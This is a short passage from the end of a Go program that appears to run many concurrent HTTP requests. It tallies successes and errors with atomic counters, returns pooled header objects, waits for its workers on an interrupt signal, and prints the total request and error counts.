					atomic.AddInt64(&totalRequests, 1)
				} else {
					atomic.AddInt64(&totalErrors, 1)
				}

				headerMapPool.Put(headerMap)
				headerPool.Put(headers)
			}
		}(cw, w)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	select {
	case <-sig:
		cancel()
	case <-ctx.Done():
	}
	wg2.Wait()
	fmt.Println()
	fmt.Printf("Total requests: %d, Errors: %d\n", totalRequests, totalErrors)
}
